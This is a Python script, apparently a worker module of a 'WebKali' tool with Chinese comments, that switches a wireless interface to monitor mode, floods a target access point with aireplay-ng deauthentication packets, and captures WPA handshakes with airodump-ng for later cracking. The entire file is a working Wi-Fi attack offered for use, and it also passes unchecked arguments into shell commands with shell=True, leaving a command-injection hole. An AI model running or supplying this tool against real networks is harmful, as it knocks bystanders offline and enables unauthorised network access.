import argparse
import subprocess
import time
import os
import sys
import glob


# ==========================================
# WebKali 攻击执行单元 (Attack Worker) v5.5
# 职责: 执行 Deauth 攻击、捕获握手包
# ==========================================

def run_cmd(cmd):
    """静默执行命令"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def setup_monitor(interface, channel):
    """强力配置监听模式"""
    print(f"[*] Setting up {interface} on CH {channel}")

    # 保护 SSH 网卡
    if "eth" in interface:
        print("[!] ERROR: 禁止操作 eth 有线网卡")
        sys.exit(1)

    # 1. 尝试激活监听
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")

    # 2. 强切信道 (多试几次，防止失败)
    for _ in range(3):
        run_cmd(f"iw dev {interface} set channel {channel}")
        # 兼容旧指令
        run_cmd(f"iwconfig {interface} channel {channel}")
        time.sleep(0.5)


def attack_deauth(bssid, interface, duration):
    """Deauth 洪水攻击"""
    print(f"[*] Starting Deauth Flood -> {bssid}")

    # 使用 --ignore-negative-one 修复部分网卡报错
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(int(duration))
    finally:
        proc.terminate()
        run_cmd("killall aireplay-ng")


def capture_handshake(bssid, interface, channel, duration):
    """握手包捕获流程"""
    print(f"[*] Capture started: {bssid} (CH {channel})")

    # 清理冲突
    run_cmd("killall airodump-ng aireplay-ng")
    setup_monitor(interface, channel)

    prefix = f"/tmp/handshake_{bssid.replace(':', '')}"
    for f in glob.glob(f"{prefix}*"): os.remove(f)

    # 1. 启动录制
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {prefix} --output-format pcap {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. 循环攻击诱发重连
    start = time.time()
    while (time.time() - start) < int(duration):
        if dump_proc.poll() is not None: break

        print("[*] Sending Deauth packets...")
        # 间歇性发包，给客户端重连的机会
        run_cmd(f"aireplay-ng --ignore-negative-one -0 5 -a {bssid} {interface}")

        time.sleep(5)

    dump_proc.terminate()
    run_cmd("killall airodump-ng")

    # 3. 结果检查
    cap = f"{prefix}-01.cap"
    if not os.path.exists(cap): cap = f"{prefix}-01.pcap"

    if os.path.exists(cap) and os.path.getsize(cap) > 1000:
        print(f"[SUCCESS] File generated: {cap}")
        print("CAPTURED_HS_POTENTIAL")
    else:
        print("[FAIL] Capture failed or file empty")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="30")
    args = parser.parse_args()

    if args.mode == "deauth":
        setup_monitor(args.interface, args.channel)
        attack_deauth(args.bssid, args.interface, args.duration)
    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)